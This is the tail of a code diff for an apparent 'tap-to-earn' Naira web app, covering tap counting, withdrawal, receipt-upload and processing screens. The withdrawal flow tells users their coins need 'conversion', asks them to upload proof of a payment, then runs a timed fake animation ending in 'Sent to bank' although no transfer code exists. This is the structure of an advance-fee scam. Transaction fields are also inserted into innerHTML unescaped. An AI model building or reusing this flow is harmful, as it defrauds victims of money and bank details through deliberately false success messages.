+            '<div class="history-item-icon">' + icon + '</div>' +
+            '<div class="history-item-info">' +
+                '<div class="history-item-title">' + tx.title + '</div>' +
+                '<div class="history-item-time">' + tx.time + '</div>' +
+                statusBadge +
+            '</div>' +
+            '<div class="history-item-amount ' + amountColor + '">' + tx.amount + '</div>' +
+            '</div>';
+    }).join('');
+
+}
+
+function showHistoryScreen() {
+
+    document.getElementById('dashboardScreen').classList.remove('active');
+
+    document.getElementById('withdrawScreen').classList.remove('active');
+
+    document.getElementById('historyScreen').classList.add('active');
+
+    renderHistory();
+
+}
+
+
+
+function updateDashboard() {
+
+    document.getElementById('coinCount').textContent = coinCount;
+
+    document.getElementById('nairaCount').textContent = nairaBalance.toFixed(2);
+
+    document.getElementById('balanceAmount').textContent = coinCount;
+
+    const nairaVal = document.getElementById('nairaValueDisplay');
+
+    if (nairaVal) nairaVal.textContent = nairaBalance.toFixed(0);
+
+    // Progress bar
+
+    const pct = (tapCount / TAPS_PER_COIN) * 100;
+
+    const bar = document.getElementById('tapProgressBar');
+
+    const lbl = document.getElementById('tapProgressLabel');
+
+    const nxt = document.getElementById('nextCoinLabel');
+
+    if (bar) bar.style.width = pct + '%';
+
+    if (lbl) lbl.textContent = tapCount + ' / 10 taps';
+
+    if (nxt) nxt.textContent = tapCount === 0 ? '10 more taps' : (TAPS_PER_COIN - tapCount) + ' more taps';
+
+    // Persist
+
+    if (currentUser) {
+
+        currentUser.coinCount = coinCount;
+
+        currentUser.nairaBalance = nairaBalance;
+
+        users[currentUser.phone] = currentUser;
+
+        saveUsers();
+
+    }
+
+}
+
+
+
+function handleCoinTap(event) {
+
+    event.stopPropagation();
+
+    tapCount++;
+
+    const area = document.getElementById('tapCoinArea');
+
+    const rect = area.getBoundingClientRect();
+
+    const x = event.clientX - rect.left;
+
+    const y = event.clientY - rect.top;
+
+    const particle = document.createElement('div');
+
+    particle.className = 'tap-particle';
+
+    particle.textContent = '+1';
+
+    particle.style.left = (x - 10) + 'px';
+
+    particle.style.top = (y - 20) + 'px';
+
+    area.appendChild(particle);
+
+    setTimeout(() => particle.remove(), 800);
+
+
+
+    if (tapCount >= TAPS_PER_COIN) {
+
+        tapCount = 0;
+
+        coinCount++;
+
+        nairaBalance += NAIRA_PER_COIN;
+
+        showToast('+1 Coin = +N120!', 'success');
+
+    }
+
+    updateDashboard();
+
+}
+
+
+
+function switchTab(tab, el) {
+
+    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+
+    if (el) {
+
+        el.classList.add('active');
+
+    }
+
+    if (tab === 'contact') {
+
+        showContactModal();
+
+    } else if (tab === 'withdraw') {
+
+        showWithdrawScreen();
+
+    } else if (tab === 'history') {
+
+        showHistoryScreen();
+
+    } else if (tab === 'home') {
+
+        showDashboard();
+
+    }
+
+}
+
+
+
+function showWithdrawScreen() {
+
+    document.getElementById('dashboardScreen').classList.remove('active');
+
+    document.getElementById('historyScreen').classList.remove('active');
+
+    document.getElementById('confirmScreen').classList.remove('active');
+
+    document.getElementById('paymentScreen').classList.remove('active');
+
+    document.getElementById('withdrawScreen').classList.add('active');
+
+    document.getElementById('withdrawCoinCount').textContent = coinCount;
+
+    document.getElementById('withdrawNairaCount').textContent = nairaBalance.toFixed(2);
+
+}
+
+
+
+function showDashboard() {
+
+    document.getElementById('withdrawScreen').classList.remove('active');
+
+    document.getElementById('historyScreen').classList.remove('active');
+
+    document.getElementById('confirmScreen').classList.remove('active');
+
+    document.getElementById('paymentScreen').classList.remove('active');
+
+    document.getElementById('dashboardScreen').classList.add('active');
+
+    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+
+    document.querySelectorAll('.nav-item')[0].classList.add('active');
+
+
+
+}
+
+
+
+let pendingWithdrawal = {};
+
+
+
+function handleWithdraw() {
+
+    const bankName = document.getElementById('withdrawBankName').value.trim();
+
+    const accountName = document.getElementById('withdrawAccountName').value.trim();
+
+    const accountNumber = document.getElementById('withdrawAccountNumber').value.trim();
+
+    const amount = parseFloat(document.getElementById('withdrawAmount').value.trim());
+
+
+
+    if (!bankName || !accountName || !accountNumber || !amount) {
+
+        showToast('Please fill all fields', '');
+
+        return;
+
+    }
+
+    if (!amount || amount <= 0) {
+
+        showToast('Please enter a valid amount', '');
+
+        return;
+
+    }
+
+    if (amount > nairaBalance) {
+
+        showToast('Insufficient balance', '');
+
+        return;
+
+    }
+
+
+
+    // Save details and go to confirm screen
+
+    pendingWithdrawal = { bankName, accountName, accountNumber, amount };
+
+    showConfirmScreen();
+
+}
+
+
+
+function showConfirmScreen() {
+
+    document.getElementById('withdrawScreen').classList.remove('active');
+
+    document.getElementById('paymentScreen').classList.remove('active');
+
+    document.getElementById('confirmScreen').classList.add('active');
+
+    document.getElementById('confirmBank').textContent = pendingWithdrawal.bankName || '—';
+
+    document.getElementById('confirmAccName').textContent = pendingWithdrawal.accountName || '—';
+
+    document.getElementById('confirmAccNumber').textContent = pendingWithdrawal.accountNumber || '—';
+
+    document.getElementById('confirmAmount').textContent = '₦' + (pendingWithdrawal.amount || 0).toLocaleString();
+
+
+
+    // Reset typewriter
+
+    const textEl = document.getElementById('typingText');
+
+    const proceedBtn = document.getElementById('proceedBtn');
+
+    const dots = document.getElementById('processingDots');
+
+    textEl.innerHTML = '';
+
+    proceedBtn.style.display = 'none';
+
+    dots.style.display = 'flex';
+
+
+
+    const message = 'Your coins need to be converted to Naira before the withdrawal can be successfully sent to your bank account. Tap PROCEED below to start the conversion and complete your withdrawal.';
+
+    let i = 0;
+
+    const speed = 28;
+
+
+
+    function type() {
+
+        if (i < message.length) {
+
+            const char = message.charAt(i);
+
+            if (message.substring(i, i + 7) === 'PROCEED') {
+
+                textEl.innerHTML += '<strong style="color:#ffd700">PROCEED</strong>';
+
+                i += 7;
+
+            } else {
+
+                textEl.innerHTML += char;
+
+                i++;
+
+            }
+
+            setTimeout(type, speed);
+
+        } else {
+
+            // Done typing — hide dots, show button
+
+            dots.style.display = 'none';
+
+            proceedBtn.style.display = 'block';
+
+            proceedBtn.style.animation = 'fadeInUp 0.4s ease';
+
+        }
+
+    }
+
+    setTimeout(type, 400);
+
+}
+
+
+
+function showPaymentScreen() {
+
+    // Add Processing entry to history when PROCEED is clicked
+    // Always add new processing entry - allow multiple withdrawals
+    var entry = {
+        type: 'withdraw',
+        status: 'processing',
+        title: 'Withdrawal to ' + (pendingWithdrawal.bankName || 'Bank'),
+        amount: '₦' + (pendingWithdrawal.amount || 0).toLocaleString(),
+        time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
+        pendingWithdrawal: Object.assign({}, pendingWithdrawal)
+    };
+    txHistory.unshift(entry);
+
+    // Deduct naira and coins immediately when processing starts
+    nairaBalance = Math.max(0, nairaBalance - (pendingWithdrawal.amount || 0));
+    coinCount = Math.max(0, coinCount - Math.ceil((pendingWithdrawal.amount || 0) / NAIRA_PER_COIN));
+    updateDashboard();
+
+    // Save
+    if (currentUser) {
+        currentUser.txHistory = txHistory;
+        currentUser.nairaBalance = nairaBalance;
+        currentUser.coinCount = coinCount;
+        users[currentUser.phone] = currentUser;
+        saveUsers();
+    } else {
+        sessionStorage.setItem('tap2cash_txHistory', JSON.stringify(txHistory));
+    }
+
+    document.getElementById('confirmScreen').classList.remove('active');
+    document.getElementById('paymentScreen').classList.add('active');
+    document.getElementById('paymentAmountDisplay').textContent = '₦' + (pendingWithdrawal.amount || 0).toLocaleString();
+
+}
+
+
+
+function previewReceipt(event) {
+
+    const file = event.target.files[0];
+
+    if (!file) return;
+
+    const preview = document.getElementById('receiptPreview');
+
+    const nameEl = document.getElementById('receiptFileName');
+
+    const reader = new FileReader();
+
+    reader.onload = (e) => {
+
+        preview.src = e.target.result;
+
+        preview.style.display = 'block';
+
+        nameEl.textContent = '✓ ' + file.name;
+
+        nameEl.style.display = 'block';
+
+        document.getElementById('uploadCircle').innerHTML = '<span style="font-size:20px">✓</span> Receipt uploaded — tap to change';
+
+        document.getElementById('uploadHint').style.display = 'none';
+
+    };
+
+    reader.readAsDataURL(file);
+
+}
+
+
+
+function handleSubmitPayment() {
+
+    const receipt = document.getElementById('receiptInput').files[0];
+
+    if (!receipt) {
+
+        showToast('Please upload your payment receipt', '');
+
+        return;
+
+    }
+
+    const btn = document.querySelector('.submit-btn');
+
+    btn.textContent = 'SUBMITTING...';
+
+    btn.disabled = true;
+
+    setTimeout(() => {
+
+        btn.textContent = 'SUBMIT PROOF';
+        btn.disabled = false;
+
+        // Hide payment screen and show processing screen
+        document.getElementById('paymentScreen').classList.remove('active');
+        startProcessingAnimation();
+
+    }, 1000);
+
+}
+
+function startProcessingAnimation() {
+    var screen = document.getElementById('processingScreen');
+    screen.classList.add('active');
+
+    // Update step 3 text with actual bank and amount
+    var bankName = pendingWithdrawal.bankName || 'your bank';
+    var amount = '₦' + (pendingWithdrawal.amount || 0).toLocaleString();
+    document.getElementById('procStep3Text').textContent = 'Sending ' + amount + ' to ' + bankName + '...';
+
+    // Reset all steps
+    ['procStep1','procStep2','procStep3'].forEach(function(id) {
+        var el = document.getElementById(id);
+        el.className = 'proc-step';
+    });
+    document.getElementById('procStatus1').innerHTML = '';
+    document.getElementById('procStatus2').innerHTML = '';
+    document.getElementById('procStatus3').innerHTML = '';
+
+    // Step 1: Confirming receipt (show immediately, done after 3s)
+    setTimeout(function() {
+        var s1 = document.getElementById('procStep1');
+        s1.classList.add('visible', 'active-step');
+        document.getElementById('procStatus1').innerHTML = '<div class="proc-spinner"></div>';
+    }, 300);
+
+    setTimeout(function() {
+        var s1 = document.getElementById('procStep1');
+        s1.classList.remove('active-step');
+        s1.classList.add('done');
+        document.getElementById('procStatus1').textContent = '✅';
+
+        // Step 2: Converting coins
+        var s2 = document.getElementById('procStep2');
+        s2.classList.add('visible', 'active-step');
+        document.getElementById('procStatus2').innerHTML = '<div class="proc-spinner"></div>';
+    }, 3300);
+
+    setTimeout(function() {
+        var s2 = document.getElementById('procStep2');
+        s2.classList.remove('active-step');
+        s2.classList.add('done');
+        document.getElementById('procStatus2').textContent = '✅';
+
+        // Step 3: Sending
+        var s3 = document.getElementById('procStep3');
+        s3.classList.add('visible', 'active-step');
+        document.getElementById('procStatus3').innerHTML = '<div class="proc-spinner"></div>';
+    }, 8300);
+
+    setTimeout(function() {
+        var s3 = document.getElementById('procStep3');
+        s3.classList.remove('active-step');
+        s3.classList.add('done');
+        document.getElementById('procStatus3').textContent = '✅';
+    }, 11300);
+
+    // After all steps done - show success screen
+    setTimeout(function() {
+        screen.classList.remove('active');
+
+        // Update history entry to submitted
+        var processingIdx = txHistory.findIndex(function(tx) { return tx.status === 'processing'; });
+        if (processingIdx !== -1) {
+            txHistory[processingIdx].status = 'submitted';
+            txHistory[processingIdx].title = 'Sent to ' + (pendingWithdrawal.bankName || 'Bank');
+        }
+        if (currentUser) {
+            currentUser.txHistory = txHistory;
+            users[currentUser.phone] = currentUser;
+            saveUsers();
+        }
+
+        // Show success screen
+        document.getElementById('successAmount').textContent = '₦' + (pendingWithdrawal.amount || 0).toLocaleString();
+        document.getElementById('successBank').textContent = 'Sent to ' + (pendingWithdrawal.bankName || 'your bank') + ' — ' + (pendingWithdrawal.accountName || '');
+        document.getElementById('successScreen').classList.add('active');
+
+        // Reset fields
+        document.getElementById('withdrawBankName').value = '';
+        document.getElementById('withdrawAccountName').value = '';
+        document.getElementById('withdrawAccountNumber').value = '';
+        document.getElementById('withdrawAmount').value = '';
+        document.getElementById('receiptInput').value = '';
+        document.getElementById('receiptPreview').style.display = 'none';
+        document.getElementById('receiptFileName').style.display = 'none';
+        document.getElementById('uploadCircle').textContent = '＋';
+        document.getElementById('uploadHint').textContent = 'Tap to upload your payment screenshot or photo';
+        pendingWithdrawal = {};
+
+    }, 12500);
+
+}
+
+function goHomeFromSuccess() {
+    document.getElementById('successScreen').classList.remove('active');
+    document.getElementById('confirmScreen').classList.remove('active');
+    showDashboard();
+}
+
+function showContactModal() {
+
+    document.getElementById('contactModal').classList.add('active');
+
+}
+
+
+
+function hideContactModal(e) {
+
+    if (!e || e.target === document.getElementById('contactModal')) {
+
+        document.getElementById('contactModal').classList.remove('active');
+
+    }
+
+}
+
+
+
+function showToast(text, type) {
+
+    const toast = document.getElementById('toast');
+
+    toast.textContent = text;
+
+    toast.className = 'toast ' + type;
+
+    toast.classList.add('show');
+
+    setTimeout(() => { toast.classList.remove('show'); }, 3000);
+
+}
+
+
+
+document.getElementById('signupPhone').addEventListener('input', function(e) {
+
+    let value = e.target.value.replace(/\D/g, '');
+
+    if (value.length > 11) value = value.slice(0, 11);
+
+    e.target.value = value;
+
+});
+
+
+
+document.getElementById('loginPhone').addEventListener('input', function(e) {
+
+    let value = e.target.value.replace(/\D/g, '');
+
+    if (value.length > 11) value = value.slice(0, 11);
+
+    e.target.value = value;
+
+});
+
+</script>
+
+</body>
+
+</html>
+
